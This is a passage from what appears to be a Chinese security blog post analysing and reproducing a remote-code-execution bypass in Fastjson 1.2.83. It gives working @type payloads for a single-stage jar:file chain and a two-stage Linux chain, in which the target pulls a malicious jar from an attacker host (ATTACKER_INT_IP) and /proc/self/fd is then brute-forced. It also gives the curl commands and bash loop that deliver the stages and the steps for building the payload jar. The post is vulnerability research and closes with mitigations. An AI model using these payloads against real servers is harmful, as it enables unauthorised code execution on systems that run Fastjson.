+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Payload:</span><br><span class="line">&#123;&quot;@type&quot;:&quot;jar:file:.tmp.probe!.POC&quot;,&quot;x&quot;:1&#125;</span><br><span class="line"></span><br><span class="line">转换过程：</span><br><span class="line">@type:        jar:file:.tmp.probe!.POC</span><br><span class="line">resource:     jar:file:/tmp/probe!/POC.class</span><br><span class="line">binary name:  jar:file:.tmp.probe!.POC  ← 无 /，合法</span><br></pre></td></tr></table></figure>
+
+<p>执行链路：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1. checkAutoType 资源探测（约 :1483）</span><br><span class="line">   → getResourceAsStream(&quot;jar:file:/tmp/probe!/POC.class&quot;)</span><br><span class="line">   → 探测侧 CL（defaultClassLoader 为 null 时为 ParserConfig 的 CL）</span><br><span class="line">   → 读出 POC.class → ClassReader 见 @JSONType → jsonType=true</span><br><span class="line"></span><br><span class="line">2. checkAutoType 类加载（约 :1500）</span><br><span class="line">   → TypeUtils.loadClass(name, null, true)</span><br><span class="line">   → 分支2：TCCL.loadClass → parent delegation → 应用 CL（如 LaunchedURLClassLoader）</span><br><span class="line">   → 常规 loadClass/findClass → defineClass</span><br><span class="line">   → 首次主动使用时 &lt;clinit&gt; → RCE</span><br><span class="line"></span><br><span class="line">3. checkAutoType 短路返回（约 :1510）</span><br><span class="line">   → return clazz（跳过黑名单等后续检查）</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-2-两阶段-fd-利用（Linux）"><a href="#6-2-两阶段-fd-利用（Linux）" class="headerlink" title="6.2 两阶段 fd 利用（Linux）"></a>6.2 两阶段 fd 利用（Linux）</h3><p>6.1 的单阶段链要求目标本地已有一个可控的 jar。拿不到本地写入的话，能不能换种方式把 jar 弄到目标上？<code>jar:http:</code> 资源探测默认可达（见 5.3），可以让目标主动把恶意 jar 拉过来；问题在于拉下来之后默认加载不了（http 单阶段不可达）。Linux 的 fd 机制正好能补上这一步。</p>
+<p>Linux 上每个进程都有一个 <code>/proc/self/fd/</code> 目录，列出它当前打开的文件描述符。JVM 走 <code>jar:http://</code> 拉 jar 时，底层会把 jar 缓存为临时文件并打开一个 fd；即便这个临时文件之后被删，只要 fd 没关闭，<code>/proc/self/fd/N</code> 仍能读到那个 jar 的内容。于是思路分成两步：先用 <code>jar:http:</code> 让目标把 jar 拉下来（fd 被打开），再爆破 <code>/proc/self/fd/N</code>、用 <code>jar:file:</code> 把它加载出来，而fd文件正好就是不带后缀的文件。</p>
+<p>前提条件：目标为 Linux 系统（有 <code>/proc/self/fd/</code>），能出网访问攻击者 HTTP 服务器。</p>
+<p>Stage 1 — SSRF 下载 jar：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Payload:</span><br><span class="line">&#123;&quot;@type&quot;:&quot;jar:http:..ATTACKER_INT_IP:PORT.probe!.foo.Exception&quot;&#125;</span><br><span class="line"></span><br><span class="line">转换过程：</span><br><span class="line">@type:        jar:http:..2130706433:18081.probe!.foo.Exception</span><br><span class="line">resource:     jar:http://2130706433:18081/probe!/foo/Exception.class</span><br></pre></td></tr></table></figure>
+
+<p>Stage 1 的 class（<code>foo/Exception</code>）不带 <code>@JSONType</code> 注解，因此 <code>jsonType=false</code>，checkAutoType 拒绝加载。但 <code>getResourceAsStream</code> 已经向攻击者 HTTP 服务器发起了 GET 请求，下载的 probe.jar 被 JVM 缓存在内存中，对应的文件描述符（fd）保持打开。</p>
+<p>通过 <code>/proc/self/fd/N</code> 可以访问到这个缓存的 jar 文件。</p>
+<p>Stage 2 — 从 fd 加载 class：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Payload（爆破 fd 编号 3-256）:</span><br><span class="line">&#123;&quot;@type&quot;:&quot;jar:file:.proc.self.fd.35!.fd35.Exception&quot;&#125;</span><br><span class="line"></span><br><span class="line">转换过程：</span><br><span class="line">@type:        jar:file:.proc.self.fd.35!.fd35.Exception</span><br><span class="line">resource:     jar:file:/proc/self/fd/35!/fd35/Exception.class</span><br></pre></td></tr></table></figure>
+
+<p>probe.jar 内预先打包了 <code>fd3/Exception.class</code> 到 <code>fd256/Exception.class</code> 共 254 个 class，每个都带 <code>@JSONType</code> 注解和 <code>&lt;clinit&gt;</code> payload。只要其中一个 fd 编号命中 Stage 1 缓存的 jar，就会触发类加载和 <code>&lt;clinit&gt;</code> 执行。</p>
+<p>完整利用流程图：</p>
+<p><img src="/blog/img/friend_404.gif" data-lazy-src="/blog/image/HAMT_1784723505598_image-20260722165805290.png" alt="image-20260722165805290"></p>
+<hr>
+<h2 id="七、实战复现"><a href="#七、实战复现" class="headerlink" title="七、实战复现"></a>七、实战复现</h2><h3 id="7-1-环境"><a href="#7-1-环境" class="headerlink" title="7.1 环境"></a>7.1 环境</h3><table>
+<thead>
+<tr>
+<th>组件</th>
+<th>版本</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>OS</td>
+<td>fd 两阶段：Linux &#x2F; file 单阶段：MacOS</td>
+</tr>
+<tr>
+<td>JDK</td>
+<td>OpenJDK 1.8.0_431 &#x2F; 1.8.0_432</td>
+</tr>
+<tr>
+<td>Spring Boot</td>
+<td>2.7.18（fat-jar）</td>
+</tr>
+<tr>
+<td>Fastjson</td>
+<td>1.2.83</td>
+</tr>
+</tbody></table>
+<h3 id="7-2-目标应用"><a href="#7-2-目标应用" class="headerlink" title="7.2 目标应用"></a>7.2 目标应用</h3><p>一个最简 Spring Boot 应用，仅包含一个 <code>JSON.parse(body)</code> 端点，无任何 fastjson 配置：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Ctrl</span> &#123;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/parse&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">parse</span><span class="params">(<span class="meta">@RequestBody</span> String body)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123; <span class="keyword">return</span> <span class="string">&quot;OK: &quot;</span> + JSON.parse(body); &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Throwable e) &#123; <span class="keyword">return</span> e.getClass().getSimpleName() + <span class="string">&quot;: &quot;</span> + e.getMessage(); &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-3-攻击步骤"><a href="#7-3-攻击步骤" class="headerlink" title="7.3 攻击步骤"></a>7.3 攻击步骤</h3><ol>
+<li>生成恶意 probe.jar</li>
+</ol>
+<p>使用 ASM 生成包含 254 个 class 的 jar。每个 class 的 internal name 对应一个 fd 编号，携带 <code>@JSONType</code> 注解和 <code>&lt;clinit&gt;</code> payload。</p>
+<p><img src="/blog/img/friend_404.gif" data-lazy-src="/blog/image/HAMT_1784723505600_image-20260722170240313.png" alt="image-20260722170240313"></p>
+<ol start="2">
+<li>启动攻击者 HTTP 服务器</li>
+</ol>
+<p>在攻击者机器上启动一个 HTTP 服务器，对任意路径返回 probe.jar。</p>
+<ol start="3">
+<li>发送 Stage 1</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST https://target:8080/parse \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;&quot;@type&quot;:&quot;jar:http:..ATTACKER_INT_IP:18081.probe!.foo.Exception&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>发送 Stage 2（爆破 fd）</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> fd <span class="keyword">in</span> $(<span class="built_in">seq</span> 3 256); <span class="keyword">do</span></span><br><span class="line">  curl -X POST https://target:8080/parse \</span><br><span class="line">    -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">    -d <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;jar:file:.proc.self.fd.<span class="variable">$&#123;fd&#125;</span>!.fd<span class="variable">$&#123;fd&#125;</span>.Exception\&quot;&#125;&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="7-4-复现结果"><a href="#7-4-复现结果" class="headerlink" title="7.4 复现结果"></a>7.4 复现结果</h3><p>分两条利用链各给一组端到端结果。</p>
+<h4 id="file单阶段"><a href="#file单阶段" class="headerlink" title="file单阶段"></a>file单阶段</h4><p><strong>file 单阶段</strong>（<code>jar:file:</code>，纯默认即可达）：</p>
+<p><img src="/blog/img/friend_404.gif" data-lazy-src="/blog/image/HAMT_1784723505601_image-20260722163422001.png" alt="image-20260722163422001"></p>
+<h4 id="fd两阶段"><a href="#fd两阶段" class="headerlink" title="fd两阶段"></a>fd两阶段</h4><p><strong>fd 两阶段</strong>（Linux，<code>jar:http:</code> SSRF + <code>jar:file:/proc/self/fd/N</code>）：</p>
+<p><img src="/blog/img/friend_404.gif" data-lazy-src="/blog/image/HAMT_1784723505603_image-20260722180241932.png" alt="image-20260722180241932"></p>
+<p><img src="/blog/img/friend_404.gif" data-lazy-src="/blog/image/HAMT_1784723505606_image-20260722180023877.png" alt="image-20260722180023877"></p>
+<p>收到两次回连，随后爆破fd</p>
+<p><img src="/blog/img/friend_404.gif" data-lazy-src="/blog/image/HAMT_1784723505607_image-20260722180221129.png" alt="image-20260722180221129"></p>
+<p><img src="/blog/img/friend_404.gif" data-lazy-src="/blog/image/HAMT_1784723505609_image-20260722180304462.png" alt="image-20260722180304462"></p>
+<hr>
+<h2 id="八、总结"><a href="#八、总结" class="headerlink" title="八、总结"></a>八、总结</h2><p>在纯默认配置下（<code>autoTypeSupport=false</code>、<code>safeMode=false</code>、<code>defaultClassLoader=null</code>），<code>jar:file:</code> 形式可直接达成 gadget-free RCE；<code>jar:http:</code> 形式则需 <code>setDefaultClassLoader</code> 让 <code>loadClass</code> 走分支 1，或改用 fd 两阶段（Stage 1 仅 SSRF、Stage 2 走 <code>jar:file:</code>）。 前提是参与探测&#x2F;加载的 ClassLoader 能处理 <code>jar:</code> 形态资源名并完成类定义（典型为 Spring Boot fat-jar 的 <code>LaunchedURLClassLoader</code>），是否成立以目标进程实际 CL 行为为准。</p>
+<p>利用链的核心环节：</p>
+<ol>
+<li><code>checkAutoType</code> 的 <code>getResourceAsStream</code> 使用攻击者可控的 resource 路径（<code>@type</code> 经 replace）</li>
+<li><code>@type</code> 中的 <code>.</code> 被 replace 为 <code>/</code>，用于拼出 <code>jar:http:</code> &#x2F; <code>jar:file:</code> 等形式的资源名；原文则交给 <code>loadClass</code>（不得含 <code>/</code>）</li>
+<li>具备相应能力的 ClassLoader 读出攻击者控制的 class 字节码；带 <code>@JSONType</code> 则 <code>jsonType=true</code>，短路跳过黑名单等检查</li>
+<li><code>TypeUtils.loadClass</code>（默认经 TCCL）→ <code>defineClass</code> → 首次主动使用时 <code>&lt;clinit&gt;</code> → RCE</li>
+</ol>
+<p>整条链不依赖目标 classpath 上的第三方 gadget 库，<code>jar:file:</code> 纯默认可达；<code>jar:http:</code> 需 <code>setDefaultClassLoader</code> 或 fd 两阶段——根因是 <code>Class.forName0</code> 禁连续 <code>/</code>、而 <code>loadClass</code>→<code>defineClass</code> 放行（见 5.3）。彻底缓解仍是 <code>safeMode=true</code> 或迁移 fastjson 2.x。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://y5neko.github.io/blog">Y5neKO</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://y5neko.github.io/blog/2026/07/22/ARTICLE/">https://y5neko.github.io/blog/2026/07/22/ARTICLE/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://y5neko.github.io/blog" target="_blank">Y5neKO's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/blog/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a><a class="post-meta__tags" href="/blog/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></div><div class="post-share"><div class="social-share" data-image="/blog/image/HAMT_1784723505543_image-20260722121049808.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/blog/2026/05/26/%E6%9F%90%E6%96%B9%E6%95%99%E5%8A%A1%E7%B3%BB%E7%BB%9Fclass%E6%96%87%E4%BB%B6%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/" title="某方教务系统class文件加解密分析"><img class="cover" src="/blog/img/friend_404.gif" data-lazy-src="/blog/image/HAMT_1779784683840_image-20260526161917852.png" onerror="onerror=null;src='/blog/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">某方教务系统class文件加解密分析</div></div><div class="info-2"><div class="info-item-1">0x01用普通的tomcat启动后报错ClassFormatError: Incompatible magic value 3405691583，idea反编译失败   010打开文件头不对，数据也是一堆乱码，回头重新看了下配套的tomcat，lib下面多了javassist-3.21.0-GA.jar  同时生产环境的启动命令发现没有 -javaagent 参数，说明解密不是通过 Java Agent 实现的，解密只能在 ClassLoader 层面完成 catalina.jar &gt; org.apache.catalina.loader.WebappClassLoaderBase#findClassInternal  第一阶段：对特定框架类（Spring ASM、AspectJ、Javassist）注入解密代码 第二阶段：对所有 class 文件执行解密 0x02 解密类分析CF类对特定框架类注入解密代码 tomcat-util.jar &gt; org.apache.tomcat.util.enc.CF 123456789101112131415161718192021...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/blog/2025/12/22/123/" title="帆软export&#x2F;excel SQL注入漏洞分析及复现"><img class="cover" src="/blog/img/friend_404.gif" data-lazy-src="/blog/image/HAMT_1769241750037_image-20251222093347377.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-22</div><div class="info-item-2">帆软export&#x2F;excel SQL注入漏洞分析及复现</div></div><div class="info-2"><div class="info-item-1">官方通告https://help.fanruan.com/finereport/doc-view-4833.html  从官方通告我们可以知道漏洞点在某个 export&#x2F;excel 接口 漏洞分析我们这里以11.0版本为例   一共找到两个版本，分别调用的Handler如下： 123com.fr.nx.app.web.handler.export.largeds.LargeDatasetExcelExportHandlercom.fr.nx.app.web.v9.handler.handler.largeds.LargeDatasetExcelExportHandler  分别跟进看了一下，解析的逻辑大差不差   暂且不管，随便调一个往下看，这里先看v9 官方说是SQL注入漏洞，那么我们重点关注sql相关语句，跟到doHandle方法下个断点  前两行分别是从请求当中的sessionID来获取一个模板对象以及对应的Calculator，主要是用于处理各种公式运算  这里的sessionID是每个表格每次导出所对应的sessionID值，随便导出一个示例表格可以得到 随后...</div></div></div></a><a class="pagination-related" href="/blog/2026/05/08/Ghost%20Bits%20_%20Cast%20Attack%20%E5%88%86%E6%9E%90/" title="Ghost Bits &#x2F; Cast Attack 分析"><img class="cover" src="/blog/img/friend_404.gif" data-lazy-src="/blog/image/HAMT_1778230935985_1778204277218-857b9860-827f-4cd8-93a9-ee909930ff99.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-08</div><div class="info-item-2">Ghost Bits &#x2F; Cast Attack 分析</div></div><div class="info-2"><div class="info-item-1">0x01 前言在常规的Web安全攻防中，漏洞利用的各种编码绕过早就被常见WAF盘得包浆，最近也是看了浅蓝和1ue师傅在BHASIA的演讲，这里跟着原PPT对演讲中部分案例的原理进行分析  0x02 前置基础首先从Java的基本数据类型开始理解，在Java中，为了完美支持Unicode，char类型被设计为16位（2字节）。而我们在进行网络传输或底层流处理时，面对的往往是byte，它是8位（1字节）的，当一个16位的char被强行塞进8位的空间时，高8位的数据会被抛弃，只保留低8位  PPT中给出的经典例子是burpsuite中处理编码时的一个问题，如图构造了一个包含中文的请求，结果发包时发现发出去的数据变成了乱码，这里以最新版（v2026.4）为例：      正好是舍弃高8位后的结果，根据师傅们的分析，罪魁祸首是DataOutputStream#writeBytes(String s)，位置在java.io.DataOutputStream  从官方注释可以知道，该方法将字符串中的每个字符写入输出流，同时丢弃其高8位，从而导致非ASCII字符的数据损坏 而Cast Attack...</div></div></div></a><a class="pagination-related" href="/blog/2026/01/14/Struts2%20XXE%E6%BC%8F%E6%B4%9E%20CVE-2025-68493/" title="Struts2 XXE漏洞（CVE-2025-68493）分析及复现"><img class="cover" src="/blog/img/friend_404.gif" data-lazy-src="/blog/image/HAMT_1769240904801_1768365305511-ddb43e5c-f5a1-43e1-b35a-ee71602fa895.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-14</div><div class="info-item-2">Struts2 XXE漏洞（CVE-2025-68493）分析及复现</div></div><div class="info-2"><div class="info-item-1">Struts2 XXE漏洞 CVE-2025-68493漏洞点位置：com.opensymphony.xwork2.util.DomHelper.parse  环境java： 1234567891011121314151617181920212223import com.opensymphony.xwork2.util.DomHelper;import org.w3c.dom.Document;import org.xml.sax.InputSource;import java.io.IOException;import java.io.StringReader;public class Test &#123;    public static void main(String[] args) throws IOException &#123;        String xmlContent = &quot;&lt;?xml version=\&quot;1.0\&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM \&quo...</div></div></div></a><a class="pagination-related" href="/blog/2025/07/25/%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%BB%8E%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%B0getshell%E8%BF%87%E7%A8%8B/" title="一次攻防演练从未授权访问到getshell过程"><img class="cover" src="/blog/img/friend_404.gif" data-lazy-src="/blog/image/wps22.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-25</div><div class="info-item-2">一次攻防演练从未授权访问到getshell过程</div></div><div class="info-2"><div class="info-item-1">信息搜集首先从目标主页进行信息搜集，发现授权文件   经过一番查找发现是《微厦在线学习考试系统》的特征项目地址：https://github.com/weishakeji/LearningSystem 查了一下公开的漏洞，可能是因为比较冷门，基本没有，后来cnvd查了下发现洞还挺多的   但都是一些比较老的，也拿不到poc，遂尝试自行挖掘 前台任意用户登录前台存在短信登录功能，我们短信登录抓包，调试分析前端源码   发现js存在一个校验验证码的过程，这里几乎可以确定能绕过 后续分析出短信登录校验逻辑为： 1前端校验验证码，md5(手机号+6位验证码) = 短信验证码响应包的result值  抓包观察验证码响应包   这里的result就是密文，搓个脚本直接爆破 123456789101112131415161718import hashlib# 固定前缀prefix = &quot;18781348729&quot;# 目标 MD5target_hash = &quot;xxxxxxxxxxxxxxxxxxxxxxxxx&quot;# 暴力破解六位验证码for i in rang...</div></div></div></a><a class="pagination-related" href="/blog/2026/05/26/%E6%9F%90%E6%96%B9%E6%95%99%E5%8A%A1%E7%B3%BB%E7%BB%9Fclass%E6%96%87%E4%BB%B6%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/" title="某方教务系统class文件加解密分析"><img class="cover" src="/blog/img/friend_404.gif" data-lazy-src="/blog/image/HAMT_1779784683840_image-20260526161917852.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-26</div><div class="info-item-2">某方教务系统class文件加解密分析</div></div><div class="info-2"><div class="info-item-1">0x01用普通的tomcat启动后报错ClassFormatError: Incompatible magic value 3405691583，idea反编译失败   010打开文件头不对，数据也是一堆乱码，回头重新看了下配套的tomcat，lib下面多了javassist-3.21.0-GA.jar  同时生产环境的启动命令发现没有 -javaagent 参数，说明解密不是通过 Java Agent 实现的，解密只能在 ClassLoader 层面完成 catalina.jar &gt; org.apache.catalina.loader.WebappClassLoaderBase#findClassInternal  第一阶段：对特定框架类（Spring ASM、AspectJ、Javassist）注入解密代码 第二阶段：对所有 class 文件执行解密 0x02 解密类分析CF类对特定框架类注入解密代码 tomcat-util.jar &gt; org.apache.tomcat.util.enc.CF 123456789101112131415161718192021...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Fastjson-1-2-83-RCE-%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">Fastjson 1.2.83 RCE 分析及复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">一、漏洞概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E6%A0%B9%E5%9B%A0%EF%BC%9AcheckAutoType-%E7%9A%84-JSONType-%E8%B5%84%E6%BA%90%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.2.</span> <span class="toc-text">二、漏洞根因：checkAutoType 的 @JSONType 资源探测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E6%BC%8F%E6%B4%9E%E5%85%A5%E5%8F%A3"><span class="toc-number">1.2.1.</span> <span class="toc-text">2.1 漏洞入口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-JSONType-%E6%97%81%E8%B7%AF%E6%9C%BA%E5%88%B6"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.2 @JSONType 旁路机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-%E7%B1%BB%E5%90%8D%E8%BD%AC%E6%8D%A2%E8%A7%84%E5%88%99%EF%BC%88%E5%85%B3%E9%94%AE%E7%BA%A6%E6%9D%9F%EF%BC%89"><span class="toc-number">1.2.3.</span> <span class="toc-text">2.3 类名转换规则（关键约束）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E4%BB%8E-getResourceAsStream-%E5%88%B0-RCE%EF%BC%9A%E6%80%9D%E8%B7%AF%E6%8E%A8%E5%AF%BC"><span class="toc-number">1.3.</span> <span class="toc-text">三、从 getResourceAsStream 到 RCE：思路推导</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E8%B5%84%E6%BA%90%E8%B7%AF%E5%BE%84%E5%AE%8C%E5%85%A8%E5%8F%AF%E6%8E%A7"><span class="toc-number">1.3.1.</span> <span class="toc-text">3.1 资源路径完全可控</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E5%BF%85%E9%A1%BB%E6%8E%A7%E5%88%B6%E8%BF%94%E5%9B%9E%E5%86%85%E5%AE%B9%EF%BC%88-JSONType%EF%BC%89"><span class="toc-number">1.3.2.</span> <span class="toc-text">3.2 必须控制返回内容（@JSONType）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-%E7%94%A8-jar-URL-%E6%89%BF%E8%BD%BD%E5%A4%96%E9%83%A8%E8%B5%84%E6%BA%90"><span class="toc-number">1.3.3.</span> <span class="toc-text">3.3 用 jar: URL 承载外部资源</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-%E5%8F%AA%E6%9C%89%E7%89%B9%E5%AE%9A-ClassLoader-%E4%BC%9A%E8%A7%A3%E6%9E%90-jar-%E8%B5%84%E6%BA%90%E5%90%8D"><span class="toc-number">1.3.4.</span> <span class="toc-text">3.4 只有特定 ClassLoader 会解析 jar: 资源名</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81ClassLoader-%E9%93%BE%E8%B7%AF%E5%88%86%E6%9E%90"><span class="toc-number">1.4.</span> <span class="toc-text">四、ClassLoader 链路分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-%E8%B5%84%E6%BA%90%E6%8E%A2%E6%B5%8B%E4%B8%8E%E7%B1%BB%E5%8A%A0%E8%BD%BD%E7%94%A8%E7%9A%84%E4%B8%8D%E6%98%AF%E5%90%8C%E4%B8%80%E6%9D%A1%E5%85%A5%E5%8F%A3"><span class="toc-number">1.4.1.</span> <span class="toc-text">4.1 资源探测与类加载用的不是同一条入口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-fat-jar-%E4%B8%8B%E7%9A%84-ClassLoader-%E5%B1%82%E7%BA%A7"><span class="toc-number">1.4.2.</span> <span class="toc-text">4.2 fat-jar 下的 ClassLoader 层级</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-TypeUtils-loadClass-%E7%9A%84%E4%B8%89%E5%88%86%E6%94%AF"><span class="toc-number">1.4.3.</span> <span class="toc-text">4.3 TypeUtils.loadClass 的三分支</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-4-jar-Handler-%E4%B8%8E%E8%B5%84%E6%BA%90%E5%90%8D%E8%A7%A3%E6%9E%90"><span class="toc-number">1.4.4.</span> <span class="toc-text">4.4 jar: Handler 与资源名解析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE%E4%B8%8B%E7%9A%84%E5%8F%AF%E8%BE%BE%E6%80%A7"><span class="toc-number">1.5.</span> <span class="toc-text">五、默认配置下的可达性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-defaultClassLoader-null-%E7%9A%84%E6%AD%A3%E7%A1%AE%E8%B7%AF%E5%BE%84"><span class="toc-number">1.5.1.</span> <span class="toc-text">5.1 defaultClassLoader &#x3D; null 的正确路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-payload-%E6%A0%BC%E5%BC%8F%E8%A6%81%E6%B1%82"><span class="toc-number">1.5.2.</span> <span class="toc-text">5.2 payload 格式要求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-3-%E9%87%8D%E7%82%B9%EF%BC%9Afile-%E4%B8%8E-http-%E7%9A%84%E6%A0%B9%E6%9C%AC%E5%B7%AE%E5%BC%82"><span class="toc-number">1.5.3.</span> <span class="toc-text">5.3 重点：file 与 http 的根本差异</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">1.6.</span> <span class="toc-text">六、利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#6-1-%E5%8D%95%E9%98%B6%E6%AE%B5%E6%9C%AC%E5%9C%B0-jar-%E5%88%A9%E7%94%A8"><span class="toc-number">1.6.1.</span> <span class="toc-text">6.1 单阶段本地 jar 利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-2-%E4%B8%A4%E9%98%B6%E6%AE%B5-fd-%E5%88%A9%E7%94%A8%EF%BC%88Linux%EF%BC%89"><span class="toc-number">1.6.2.</span> <span class="toc-text">6.2 两阶段 fd 